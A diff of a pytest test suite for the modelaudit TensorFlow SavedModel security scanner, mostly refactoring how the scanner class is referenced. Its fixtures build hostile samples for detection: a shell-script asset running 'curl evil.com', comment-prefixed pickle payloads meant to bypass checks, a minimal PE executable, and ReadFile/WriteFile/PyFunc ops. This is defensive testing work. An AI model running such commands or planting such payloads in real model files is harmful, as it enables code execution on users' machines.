@@ -10,7 +10,6 @@ import pytest
 import modelaudit.scanners.tf_savedmodel_scanner as tf_savedmodel_module
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.tf_savedmodel_scanner import _ASSET_PROBE_BYTES, TensorFlowSavedModelScanner
 from modelaudit.utils.file.detection import PROTO0_1_MAX_PROBE_BYTES
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as has_tf_protos
 
@@ -58,14 +57,16 @@ def test_tf_savedmodel_scanner_can_handle(tmp_path: Path) -> None:
 
     if has_tf_protos():
         # With vendored protos or TensorFlow, can_handle works for valid paths
-        assert TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is True
-        assert TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(test_file)) is True  # Now accepts any .pb file
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is True
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
+        assert (
+            tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is True
+        )  # Now accepts any .pb file
     else:
         # Without protos, can_handle returns False
-        assert TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(test_file)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is False
 
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@@ -78,10 +79,12 @@ def test_tf_savedmodel_read_failure_is_inconclusive_not_security_finding(
     def raise_os_error(*_args: object, **_kwargs: object) -> None:
         raise OSError("simulated SavedModel read failure")
 
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "can_handle", classmethod(lambda _cls, _path: True))
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner, "can_handle", classmethod(lambda _cls, _path: True)
+    )
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", raise_os_error, raising=False)
 
-    direct = TensorFlowSavedModelScanner().scan(path)
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(path)
     aggregate = scan_model_directory_or_file(path, cache_scan_results=False)
 
     read_checks = [check for check in direct.checks if check.name == "SavedModel File Read"]
@@ -119,7 +122,7 @@ def test_tf_savedmodel_unreadable_file_preflight_is_operational(
 
     monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)
 
-    direct = TensorFlowSavedModelScanner().scan(str(path))
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(path))
     aggregate = scan_model_directory_or_file(str(path), cache_scan_results=False)
 
     assert direct.metadata["operational_error_reason"] == "savedmodel_read_failed"
@@ -140,7 +143,7 @@ def test_tf_savedmodel_unreadable_keras_metadata_is_operational(
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", raise_os_error, raising=False)
 
-    result = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
     aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)
 
     assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
@@ -169,7 +172,7 @@ def test_tf_savedmodel_directory_keeps_keras_metadata_read_failure_operational(
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", fail_metadata_read, raising=False)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
     assert result.metadata["scan_outcome_reasons"] == ["savedmodel_read_failed"]
@@ -186,7 +189,7 @@ def test_tf_savedmodel_directory_oversized_keras_metadata_is_inconclusive(
     metadata_path.write_bytes(b"A" * 33)
     monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
 
-    direct = TensorFlowSavedModelScanner().scan(str(model_dir))
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     aggregate = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
 
     budget_checks = [
@@ -214,12 +217,17 @@ def test_tf_savedmodel_standalone_oversized_keras_metadata_is_inconclusive(
     metadata_path = tmp_path / "keras_metadata.pb"
     metadata_path.write_bytes(b"A" * 33)
     monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner,
+        "calculate_file_hashes",
+        lambda *_args, **_kwargs: pytest.fail("oversized metadata must be rejected before hashing"),
+    )
 
-    direct = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
     aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)
 
     assert direct.success is False
-    assert direct.bytes_scanned == 32
+    assert direct.bytes_scanned == 0
     assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
     assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_budget_exceeded"]
@@ -229,6 +237,7 @@ def test_tf_savedmodel_standalone_oversized_keras_metadata_is_inconclusive(
         and check.details["max_parse_bytes"] == 32
         for check in direct.checks
     )
+    assert not any(check.name == "File Integrity Hash" for check in direct.checks)
     assert determine_exit_code(aggregate) == 2
 
 
@@ -242,7 +251,7 @@ def test_tf_savedmodel_in_budget_keras_metadata_preserves_success(
     metadata_path.write_bytes(b'{"class_name": "Dense"}')
     monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 64)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert result.success is True
     assert "scan_outcome" not in result.metadata
@@ -257,8 +266,10 @@ def test_suspicious_function_name_reuses_precompiled_patterns(monkeypatch: pytes
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.re.compile", fail_compile)
 
-    assert TensorFlowSavedModelScanner._match_suspicious_function_name("safe_function_name") is None
-    assert TensorFlowSavedModelScanner._match_suspicious_function_name("module.eval") == "eval"
+    assert (
+        tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("safe_function_name") is None
+    )
+    assert tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("module.eval") == "eval"
 
 
 def create_tf_savedmodel(tmp_path: Path, *, malicious: bool = False) -> Path:
@@ -347,7 +358,7 @@ def test_tf_savedmodel_scanner_safe_model(tmp_path: Path) -> None:
     """Test scanning a safe TensorFlow SavedModel."""
     model_dir = create_tf_savedmodel(tmp_path)
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(model_dir))
 
     assert result.success is True
@@ -363,7 +374,7 @@ def test_tf_savedmodel_scanner_malicious_model(tmp_path: Path) -> None:
     """Test scanning a malicious TensorFlow SavedModel."""
     model_dir = create_tf_savedmodel(tmp_path, malicious=True)
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(model_dir))
 
     assert result.success is False
@@ -394,7 +405,7 @@ def test_tf_savedmodel_scanner_invalid_model(tmp_path):
     (invalid_dir / "saved_model.pb").write_bytes(b"dummy content")
     # Missing variables directory
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(invalid_dir))
 
     # Should have issues about invalid protobuf format or TensorFlow not installed
@@ -413,7 +424,7 @@ def test_tf_savedmodel_scanner_invalid_model(tmp_path):
 def test_detect_readfile_operation(tmp_path: Path) -> None:
     # Synthesize a SavedModel containing a ReadFile node
     model_path = _create_test_savedmodel_with_op(tmp_path, "ReadFile", "readfile_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     readfile_issues = [i for i in result.issues if i.message and "ReadFile" in i.message]
@@ -426,7 +437,7 @@ def test_detect_readfile_operation(tmp_path: Path) -> None:
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_detect_pyfunc_operation(tmp_path: Path) -> None:
     model_path = _create_test_savedmodel_with_op(tmp_path, "PyFunc", "pyfunc_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     pyfunc_issues = [i for i in result.issues if i.message and "PyFunc" in i.message]
@@ -440,7 +451,7 @@ def test_detect_pyfunc_operation(tmp_path: Path) -> None:
 def test_detect_loadlibrary_operation(tmp_path: Path, op_name: str) -> None:
     model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"{op_name.lower()}_test")
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     load_library_issues = [
         issue
@@ -458,7 +469,7 @@ def test_detect_loadlibrary_operation(tmp_path: Path, op_name: str) -> None:
 def test_detect_writefile_operation(tmp_path: Path) -> None:
     # Synthesize a SavedModel containing a WriteFile node
     model_path = _create_test_savedmodel_with_op(tmp_path, "WriteFile", "writefile_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     writefile_issues = [i for i in result.issues if i.message and "WriteFile" in i.message]
@@ -495,7 +506,7 @@ def test_detect_suspicious_ops_in_function_definitions(
         model_name=f"function_def_{op_name.lower()}",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     matching_issues = [issue for issue in result.issues if issue.message and op_name in issue.message]
 
     assert matching_issues, f"Expected detection for {op_name} inside a function definition"
@@ -523,7 +534,7 @@ def test_stateful_partitioned_call_detected_in_function_definition(tmp_path: Pat
         model_name="function_def_stateful_partitioned_call",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     matching_issues = [
         issue
         for issue in result.issues
@@ -553,7 +564,7 @@ def test_stateful_partitioned_call_ignores_evaluate_like_function_names(tmp_path
         model_name="function_def_stateful_partitioned_call_evaluate",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert not any(
         issue.message and "StatefulPartitionedCall with suspicious function" in issue.message for issue in result.issues
@@ -575,7 +586,7 @@ def test_lambda_named_function_definition_nodes_do_not_trigger_lambda_layer_warn
         model_name="function_def_lambda_named_node",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert not any(issue.message == "Lambda layer detected in graph" for issue in result.issues)
 
@@ -593,7 +604,7 @@ def test_graph_lambda_named_nodes_still_trigger_lambda_layer_warning(tmp_path: P
         model_name="graph_lambda_named_node",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     lambda_issues = [issue for issue in result.issues if issue.message == "Lambda layer detected in graph"]
 
     assert lambda_issues, "Expected Lambda layer warning for top-level graph nodes"
@@ -619,7 +630,7 @@ def test_protobuf_string_injection_detected_in_function_definition(tmp_path: Pat
         model_name="function_def_string_injection",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     injection_issues = [
         issue
         for issue in result.issues
@@ -645,7 +656,7 @@ def test_function_definition_ops_are_counted_in_metadata(tmp_path: Path) -> None
         model_name="count_function_ops",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.metadata["op_counts"]["WriteFile"] == 2
     assert result.metadata["suspicious_op_found"] is True
@@ -666,7 +677,7 @@ def test_safe_function_definition_ops_do_not_trigger_findings(tmp_path: Path) ->
         model_name="safe_function_def",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.issues == []
     assert result.metadata["op_counts"]["Const"] == 1
@@ -686,7 +697,7 @@ def test_tf_savedmodel_scanner_with_blacklist(tmp_path: Path) -> None:
     )
 
     # Create scanner with custom blacklist
-    scanner = TensorFlowSavedModelScanner(
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(
         config={"blacklist_patterns": ["suspicious_function"]},
     )
     result = scanner.scan(str(model_dir))
@@ -704,7 +715,7 @@ def test_tf_savedmodel_scanner_none_blacklist_config_stays_quiet(tmp_path: Path)
     model_dir = Path(create_tf_savedmodel(tmp_path))
     (model_dir / "custom_file.txt").write_text("contains harmless text\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner(config={"blacklist_patterns": None}).scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": None}).scan(str(model_dir))
 
     assert result.success is True
     assert not any(check.name == "File Read Check" for check in result.checks)
@@ -725,7 +736,7 @@ def test_tf_savedmodel_pyfunc_reference_uses_token_boundaries(tmp_path: Path) ->
         model_name="benign_pyfunc_reference",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.success is False
     assert not any(
@@ -753,7 +764,7 @@ def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Pa
         model_name="malicious_pyfunc_reference",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.success is False
     assert any(
@@ -772,7 +783,7 @@ def test_scan_keras_metadata_pb_lambda_exec_sets_success_false(tmp_path: Path) -
     metadata_path = tmp_path / "keras_metadata.pb"
     metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())
 
-    result = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
 
     assert result.success is False
     assert any(
@@ -788,7 +799,7 @@ def test_savedmodel_assets_benign_text_file_passes(tmp_path: Path) -> None:
     model_dir = Path(create_tf_savedmodel(tmp_path))
     (model_dir / "assets" / "vocab.txt").write_text("token_a\ntoken_b\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_checks = [check for check in result.checks if check.name == "SavedModel Assets Security Check"]
 
     assert asset_checks == []
@@ -800,7 +811,7 @@ def test_savedmodel_root_sibling_pickle_is_flagged(tmp_path: Path) -> None:
     sibling_path = model_dir / "payload.dat"
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -818,7 +829,7 @@ def test_savedmodel_reserved_root_dir_name_file_is_flagged(tmp_path: Path) -> No
     sibling_path = model_dir / "assets.extra"
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -835,7 +846,7 @@ def test_savedmodel_root_sibling_benign_text_stays_clean(tmp_path: Path) -> None
     sibling_path = model_dir / "README.txt"
     sibling_path.write_text("model notes only\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert not [
         check
@@ -851,7 +862,7 @@ def test_savedmodel_root_sibling_directory_pickle_is_flagged(tmp_path: Path) -> 
     sibling_path.parent.mkdir()
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -874,7 +885,7 @@ def test_savedmodel_reserved_root_dir_name_symlink_is_reported(
     shutil.rmtree(sibling_path)
     sibling_path.symlink_to(target_path.name)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -899,7 +910,7 @@ def test_savedmodel_root_sibling_directory_symlink_is_reported_without_traversal
     sibling_path = model_dir / "supplemental"
     sibling_path.symlink_to(external_dir, target_is_directory=True)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -916,9 +927,9 @@ def test_savedmodel_root_sibling_directory_symlink_is_reported_without_traversal
 def test_savedmodel_large_unclassified_asset_marks_scan_inconclusive(tmp_path: Path) -> None:
     model_dir = Path(create_tf_savedmodel(tmp_path))
     asset_path = model_dir / "assets" / "large.dat"
-    asset_path.write_bytes(b"A" * (_ASSET_PROBE_BYTES + 1))
+    asset_path.write_bytes(b"A" * (tf_savedmodel_module._ASSET_PROBE_BYTES + 1))
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert result.success is False
     assert result.metadata["scan_outcome"] == "inconclusive"
@@ -933,7 +944,7 @@ def test_savedmodel_assets_shell_script_is_flagged(tmp_path: Path) -> None:
     asset_path = model_dir / "assets" / "evil.sh"
     asset_path.write_text("#!/bin/bash\ncurl evil.com\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [
         issue
         for issue in result.issues
@@ -955,7 +966,7 @@ def test_savedmodel_assets_python_pattern_in_non_py_file_is_flagged(tmp_path: Pa
     asset_path = model_dir / "assets" / "helper.dat"
     asset_path.write_text("import os\n\ndef runner():\n    return os.getenv('HOME')\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -977,7 +988,7 @@ def test_savedmodel_assets_numeric_class_labels_do_not_trigger_python_source_det
     asset_path = model_dir / "assets" / "labels.txt"
     asset_path.write_text("class 1: dog\nclass 2: cat\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -995,7 +1006,7 @@ def test_savedmodel_assets_extra_pe_executable_is_flagged(tmp_path: Path) -> Non
     pe_path = extra_dir / "helper.dll"
     pe_path.write_bytes(_build_minimal_pe_bytes())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(pe_path)]
     assert asset_issues
     assert any("pe_executable" in issue.details.get("detected_content_type", "") for issue in asset_issues)
@@ -1012,7 +1023,7 @@ def test_savedmodel_asset_symlink_is_reported_without_following_target(tmp_path:
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1033,7 +1044,9 @@ def test_savedmodel_asset_symlink_is_not_followed_by_blacklist_scan(
     asset_path = model_dir / "assets" / "outside-link.txt"
     asset_path.symlink_to(external_text)
 
-    result = TensorFlowSavedModelScanner(config={"blacklist_patterns": ["suspicious_function"]}).scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner(
+        config={"blacklist_patterns": ["suspicious_function"]}
+    ).scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1053,7 +1066,7 @@ def test_savedmodel_asset_directory_symlink_is_not_traversed(tmp_path: Path) -> 
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
     traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
@@ -1075,7 +1088,7 @@ def test_savedmodel_dangling_asset_directory_symlink_is_reported(
     extra_dir = model_dir / "assets.extra"
     extra_dir.symlink_to(tmp_path / "missing-assets", target_is_directory=True)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
 
     assert symlink_dir_issues
@@ -1097,7 +1110,7 @@ def test_savedmodel_nested_asset_directory_symlink_is_reported_without_traversal
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     nested_dir_issues = [issue for issue in result.issues if issue.location == str(nested_dir)]
     traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
@@ -1116,7 +1129,7 @@ def test_savedmodel_assets_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
     asset_path = model_dir / "assets" / "payload.dat"
     asset_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1129,7 +1142,7 @@ def test_savedmodel_assets_protocol1_pickle_with_binint1_pop_prefix_is_flagged(t
     asset_path = model_dir / "assets" / "prefixed-payload.dat"
     asset_path.write_bytes(b"K\x000" + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1142,7 +1155,7 @@ def test_savedmodel_assets_trivial_prefix_pickle_with_trailing_junk_is_flagged(t
     asset_path = model_dir / "assets" / "trailing-junk-payload.dat"
     asset_path.write_bytes(b"(l0" + _build_protocol1_pickle_payload() + b"JUNK")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1246,7 +1259,7 @@ def test_savedmodel_assets_extra_comment_prefixed_protocol1_pickle_is_flagged(tm
     asset_path = extra_dir / "bypass.dat"
     asset_path.write_bytes(b"#" + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1265,7 +1278,7 @@ def test_savedmodel_assets_extra_long_comment_prefixed_protocol1_pickle_is_flagg
     asset_path = extra_dir / "deep_bypass.dat"
     asset_path.write_bytes((b"# asset padding for documentation only\n" * 300) + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1278,7 +1291,7 @@ def test_tf_savedmodel_scanner_not_a_directory(tmp_path):
     test_file = tmp_path / "model.pb"
     test_file.write_bytes(b"dummy content")
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(test_file))
 
     # Should have an issue about invalid protobuf format or TensorFlow not installed
@@ -1303,7 +1316,7 @@ def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks
     missing.unlink()
     missing.symlink_to("/nonexistent/path")
 
-    scanner = TensorFlowSavedModelScanner(config={"blacklist_patterns": ["secret"]})
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": ["secret"]})
     result = scanner.scan(str(model_dir))
 
     assert any("error reading file" in issue.message.lower() for issue in result.issues)
@@ -1401,7 +1414,7 @@ def test_tf_scanner_explanations_for_all_suspicious_ops(tmp_path: Path) -> None:
         model_path = _create_test_savedmodel_with_op(tmp_path, op_name)
 
         # Scan the model
-        scanner = TensorFlowSavedModelScanner()
+        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
         result = scanner.scan(model_path)
 
         # Should detect the suspicious operation
@@ -1439,7 +1452,7 @@ def test_tf_scanner_explanation_categories(tmp_path: Path) -> None:
     for op_name in critical_ops:
         model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"critical_test_{op_name.lower()}")
 
-        scanner = TensorFlowSavedModelScanner()
+        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
         result = scanner.scan(model_path)
 
         # Find issues related to this operation
@@ -1462,7 +1475,7 @@ def test_tf_scanner_no_explanation_for_safe_ops(tmp_path: Path) -> None:
     safe_ops = ["MatMul", "Add", "Relu", "Conv2D", "MaxPool"]
     model_path = _create_test_savedmodel_with_ops(tmp_path, safe_ops, "safe_model")
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     # Should not have any critical issues about suspicious operations
